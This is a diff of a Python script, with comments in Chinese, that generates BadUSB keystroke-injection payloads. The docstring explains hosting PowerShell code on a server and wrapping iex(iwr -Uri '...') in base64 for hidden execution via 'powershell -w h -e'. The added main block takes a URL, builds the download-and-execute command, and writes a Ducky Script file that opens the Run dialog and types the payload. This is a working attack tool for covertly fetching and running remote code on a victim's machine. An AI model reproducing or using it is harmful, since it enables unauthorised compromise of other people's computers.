@@ -8,7 +8,8 @@ badusb载荷制作
 有效的载荷是这样的：
 将你的powershell代码上传到服务器如： https://localhost.com/a.html
 将这段明文通过本脚本生成base64编码： iex(iwr -Uri 'https://localhost.com/a.html')
-将生成的base64编码制作成如下badusb： cmd /c "powershell -w h -e aQBlAHgAKABpAHcAcgAgAC0AVQByAGkAIAAnAGgAdAB0AHAAcwA6AC8ALwBsAG8AYwBhAGwAaABvAHMAdAAuAGMAbwBtAC8AYQAuAGgAdABtAGwAJwApAA=="
+将生成的base64编码制作成如下badusb： cmd /c powershell -w h -e aQBlAHgAKABpAHcAcgAgAC0AVQByAGkAIAAnAGgAdAB0AHAAcwA6AC8ALwBsAG8AYwBhAGwAaABvAHMAdAAuAGMAbwBtAC8AYQAuAGgAdABtAGwAJwApAA==
+直接执行powershell也是可以的 powershell -w h -e aQBlAHgAKABpAHcAcgAgAC0AVQByAGkAIAAnAGgAdAB0AHAAcwA6AC8ALwBsAG8AYwBhAGwAaABvAHMAdAAuAGMAbwBtAC8AYQAuAGgAdABtAGwAJwApAA==
 """
 
 def encode_to_base64(text):
@@ -21,9 +22,18 @@ def decode_from_base64(base64_str):
     text = utf16_byte.decode('utf-16le')
     return text
 
-if __name__ == '__main__':
+def encode_test():
     text = input("输入待编码的明文： ")
     base64_str = encode_to_base64(text)
     print(f'编码base64： {base64_str}')
     retext = decode_from_base64(base64_str)
     print(f'还原明文： {retext}')
+
+if __name__ == '__main__':
+    url = input('输入载荷网址: ')
+    base64_str = encode_to_base64(f"iex(iwr -Uri '{url}')")
+    print(f'编码base64: {base64_str}')
+    payload = f'cmd /c powershell -w h -e {base64_str}'  # 不使用引号也能执行成功，使用引号可能因为全角符号失败，可通过alt+34输入双引号或者alt+39输入单引号
+    print(f'badusb:  {payload}')
+    with open("svh.txt", "w") as f:
+        f.write(f'GUI r\nDELAY 1000\nSTRING {payload}\nDELAY 500\nENTER')
